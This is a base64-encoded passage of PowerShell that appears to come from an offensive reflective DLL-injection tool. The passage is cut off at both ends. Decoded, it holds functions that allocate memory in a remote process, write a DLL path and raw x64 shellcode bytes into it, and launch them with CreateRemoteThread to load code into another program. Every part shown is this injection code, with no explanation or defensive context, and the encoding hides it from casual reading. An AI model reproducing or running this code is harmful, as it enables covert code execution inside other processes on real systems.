ICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uTnRIZWFkZXJzUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlM2NCkpKQogICAgICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU2VjdGlvbkhlYWRlclB0ciAtVmFsdWUgJFNlY3Rpb25IZWFkZXJQdHIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5OdEhlYWRlcnNQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzMyKSkpCiAgICAgICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTZWN0aW9uSGVhZGVyUHRyIC1WYWx1ZSAkU2VjdGlvbkhlYWRlclB0cgogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuRmlsZUhlYWRlci5DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRExMKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRExMKQogICAgICAgIHsKICAgICAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEZpbGVUeXBlIC1WYWx1ZSAnRExMJwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0VYRUNVVEFCTEVfSU1BR0UpIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9FWEVDVVRBQkxFX0lNQUdFKQogICAgICAgIHsKICAgICAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEZpbGVUeXBlIC1WYWx1ZSAnRVhFJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiUEUgZmlsZSBpcyBub3QgYW4gRVhFIG9yIERMTCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRQRUluZm8KICAgIH0KICAgIAogICAgCiAgICBGdW5jdGlvbiBJbXBvcnQtRGxsSW5SZW1vdGVQcm9jZXNzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFJlbW90ZVByb2NIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJEltcG9ydERsbFBhdGhQdHIKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pCiAgICAgICAgCiAgICAgICAgJEltcG9ydERsbFBhdGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEltcG9ydERsbFBhdGhQdHIpCiAgICAgICAgJERsbFBhdGhTaXplID0gW1VJbnRQdHJdW1VJbnQ2NF0oW1VJbnQ2NF0kSW1wb3J0RGxsUGF0aC5MZW5ndGggKyAxKQogICAgICAgICRSSW1wb3J0RGxsUGF0aFB0ciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRGxsUGF0aFNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgaWYgKCRSSW1wb3J0RGxsUGF0aFB0ciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgfQoKICAgICAgICBbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJJbXBvcnREbGxQYXRoUHRyLCAkSW1wb3J0RGxsUGF0aFB0ciwgJERsbFBhdGhTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgCiAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIERMTCBwYXRoIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSIKICAgICAgICB9CiAgICAgICAgaWYgKCREbGxQYXRoU2l6ZSAtbmUgJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJEaWRuJ3Qgd3JpdGUgdGhlIGV4cGVjdGVkIGFtb3VudCBvZiBieXRlcyB3aGVuIHdyaXRpbmcgYSBETEwgcGF0aCB0byBsb2FkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoImtlcm5lbDMyLmRsbCIpCiAgICAgICAgJExvYWRMaWJyYXJ5QUFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIkxvYWRMaWJyYXJ5QSIpICNLZXJuZWwzMiBsb2FkZWQgdG8gdGhlIHNhbWUgYWRkcmVzcyBmb3IgYWxsIHByb2Nlc3NlcwogICAgICAgIAogICAgICAgIFtJbnRQdHJdJERsbEFkZHJlc3MgPSBbSW50UHRyXTo6WmVybwogICAgICAgICNGb3IgNjRiaXQgRExMJ3MsIHdlIGNhbid0IHVzZSBqdXN0IENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIExvYWRMaWJyYXJ5IGJlY2F1c2UgR2V0RXhpdENvZGVUaHJlYWQgd2lsbCBvbmx5IGdpdmUgYmFjayBhIDMyYml0IHZhbHVlLCBidXQgd2UgbmVlZCBhIDY0Yml0IGFkZHJlc3MKICAgICAgICAjICAgSW5zdGVhZCwgd3JpdGUgc2hlbGxjb2RlIHdoaWxlIGNhbGxzIExvYWRMaWJyYXJ5IGFuZCB3cml0ZXMgdGhlIHJlc3VsdCB0byBhIG1lbW9yeSBhZGRyZXNzIHdlIHNwZWNpZnkuIFRoZW4gcmVhZCBmcm9tIHRoYXQgbWVtb3J5IG9uY2UgdGhlIHRocmVhZCBmaW5pc2hlcy4KICAgICAgICBpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICNBbGxvY2F0ZSBtZW1vcnkgZm9yIHRoZSBhZGRyZXNzIHJldHVybmVkIGJ5IExvYWRMaWJyYXJ5QQogICAgICAgICAgICAkTG9hZExpYnJhcnlBUmV0TWVtID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sICREbGxQYXRoU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgaWYgKCRMb2FkTGlicmFyeUFSZXRNZW0gLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHRoZSByZXR1cm4gdmFsdWUgb2YgTG9hZExpYnJhcnlBIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgI1dyaXRlIFNoZWxsY29kZSB0byB0aGUgcmVtb3RlIHByb2Nlc3Mgd2hpY2ggd2lsbCBjYWxsIExvYWRMaWJyYXJ5QSAoU2hlbGxjb2RlOiBMb2FkTGlicmFyeUEuYXNtKQogICAgICAgICAgICAkTG9hZExpYnJhcnlTQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICRMb2FkTGlicmFyeVNDMiA9IEAoMHg0OCwgMHhiYSkKICAgICAgICAgICAgJExvYWRMaWJyYXJ5U0MzID0gQCgweGZmLCAweGQyLCAweDQ4LCAweGJhKQogICAgICAgICAgICAkTG9hZExpYnJhcnlTQzQgPSBAKDB4NDgsIDB4ODksIDB4MDIsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgICAgIAogICAgICAgICAgICAkU0NMZW5ndGggPSAkTG9hZExpYnJhcnlTQzEuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0MyLkxlbmd0aCArICRMb2FkTGlicmFyeVNDMy5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzQuTGVuZ3RoICsgKCRQdHJTaXplICogMykKICAgICAgICAgICAgJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQogICAgICAgICAgICAkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW0KICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzEuTGVuZ3RoKQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUkltcG9ydERsbFBhdGhQdHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzIgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MyLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJExvYWRMaWJyYXJ5QUFkZHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzMgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MzLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJExvYWRMaWJyYXJ5QVJldE1lbSwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDNCAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzQuTGVuZ3RoKQoKICAgICAgICAgICAgCiAgICAgICAgICAgICRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgJFNDUFNNZW1PcmlnaW5hbCwgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICAgICAgaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIHNoZWxsY29kZSB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkuIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKQogICAgICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgI1RoZSBzaGVsbGNvZGUgd3JpdGVzIHRoZSBETEwgYWRkcmVzcyB0byBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGF0IGFkZHJlc3MgJExvYWRMaWJyYXJ5QVJldE1lbSwgcmVhZCB0aGlzIG1lbW9yeQogICAgICAgICAgICBbSW50UHRyXSRSZXR1cm5WYWxNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuUmVhZFByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkTG9hZExpYnJhcnlBUmV0TWVtLCAkUmV0dXJuVmFsTWVtLCBbVUludFB0cl1bVUludDY0XSRQdHJTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIFJlYWRQcm9jZXNzTWVtb3J5IGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICBbSW50UHRyXSREbGxBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJldHVyblZhbE1lbSwgW1R5cGVdW0ludFB0cl0pCgogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkTGlicmFyeUFSZXRNZW0sIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJExvYWRMaWJyYXJ5QUFkZHIgLUFyZ3VtZW50UHRyICRSSW1wb3J0RGxsUGF0aFB0ciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKQogICAgICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgW0ludDMyXSRFeGl0Q29kZSA9IDAKICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRFeGl0Q29kZVRocmVhZC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIFtSZWZdJEV4aXRDb2RlKQogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1vciAoJEV4aXRDb2RlIC1lcSAwKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gR2V0RXhpdENvZGVUaHJlYWQgZmFpbGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl0kRXhpdENvZGUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkltcG9ydERsbFBhdGhQdHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgcmV0dXJuICREbGxBZGRyZXNzCiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gR2V0LVJlbW90ZVByb2NBZGRyZXNzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFJlbW90ZVByb2NIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFJlbW90ZURsbEhhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTIsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkRnVuY3Rpb25OYW1lUHRyLCNUaGlzIGNhbiBlaXRoZXIgYmUgYSBwdHIgdG8gYSBzdHJpbmcgd2hpY2ggaXMgdGhlIGZ1bmN0aW9uIG5hbWUsIG9yLCBpZiBMb2FkQnlPcmRpbmFsIGlzICd0cnVlJyB0aGlzIGlzIGFuIG9yZGluYWwgbnVtYmVyIChwb2ludHMgdG8gbm90aGluZykKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtCb29sXQogICAgICAgICRMb2FkQnlPcmRpbmFsCiAgICAgICAgKQoKICAgICAgICAkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgW0ludFB0cl0kUkZ1bmNOYW1lUHRyID0gW0ludFB0cl06Olplcm8gICAjUG9pbnRlciB0byB0aGUgZnVuY3Rpb24gbmFtZSBpbiByZW1vdGUgcHJvY2VzcyBtZW1vcnkgaWYgbG9hZGluZyBieSBmdW5jdGlvbiBuYW1lLCBvcmRpbmFsIG51bWJlciBpZiBsb2FkaW5nIGJ5IG9yZGluYWwKICAgICAgICAjSWYgbm90IGxvYWRpbmcgYnkgb3JkaW5hbCwgd3JpdGUgdGhlIGZ1bmN0aW9uIG5hbWUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgIGlmICgtbm90ICRMb2FkQnlPcmRpbmFsKQogICAgICAgIHsKICAgICAgICAgICAgJEZ1bmN0aW9uTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkRnVuY3Rpb25OYW1lUHRyKQoKICAgICAgICAgICAgI1dyaXRlIEZ1bmN0aW9uTmFtZSB0byBtZW1vcnkgKHdpbGwgYmUgdXNlZCBpbiBHZXRQcm9jQWRkcmVzcykKICAgICAgICAgICAgJEZ1bmN0aW9uTmFtZVNpemUgPSBbVUludFB0cl1bVUludDY0XShbVUludDY0XSRGdW5jdGlvbk5hbWUuTGVuZ3RoICsgMSkKICAgICAgICAgICAgJFJGdW5jTmFtZVB0ciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRnVuY3Rpb25OYW1lU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgaWYgKCRSRnVuY05hbWVQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFtVSW50UHRyXSROdW1CeXRlc1dyaXR0ZW4gPSBbVUludFB0cl06Olplcm8KICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJGdW5jTmFtZVB0ciwgJEZ1bmN0aW9uTmFtZVB0ciwgJEZ1bmN0aW9uTmFtZVNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgRExMIHBhdGggdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkRnVuY3Rpb25OYW1lU2l6ZSAtbmUgJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkRpZG4ndCB3cml0ZSB0aGUgZXhwZWN0ZWQgYW1vdW50IG9mIGJ5dGVzIHdoZW4gd3JpdGluZyBhIERMTCBwYXRoIHRvIGxvYWQgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICNJZiBsb2FkaW5nIGJ5IG9yZGluYWwsIGp1c3Qgc2V0IFJGdW5jTmFtZVB0ciB0byBiZSB0aGUgb3JkaW5hbCBudW1iZXIKICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkUkZ1bmNOYW1lUHRyID0gJEZ1bmN0aW9uTmFtZVB0cgogICAgICAgIH0KICAgICAgICAKICAgICAgICAjR2V0IGFkZHJlc3Mgb2YgR2V0UHJvY0FkZHJlc3MKICAgICAgICAkS2VybmVsMzJIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgia2VybmVsMzIuZGxsIikKICAgICAgICAkR2V0UHJvY0FkZHJlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJHZXRQcm9jQWRkcmVzcyIpICNLZXJuZWwzMiBsb2FkZWQgdG8gdGhlIHNhbWUgYWRkcmVzcyBmb3IgYWxsIHByb2Nlc3NlcwoKICAgICAgICAKICAgICAgICAjQWxsb2NhdGUgbWVtb3J5IGZvciB0aGUgYWRkcmVzcyByZXR1cm5lZCBieSBHZXRQcm9jQWRkcmVzcwogICAgICAgICRHZXRQcm9jQWRkcmVzc1JldE1lbSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludDY0XVtVSW50NjRdJFB0clNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgaWYgKCRHZXRQcm9jQWRkcmVzc1JldE1lbSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHRoZSByZXR1cm4gdmFsdWUgb2YgR2V0UHJvY0FkZHJlc3MiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICNXcml0ZSBTaGVsbGNvZGUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIHdoaWNoIHdpbGwgY2Fsb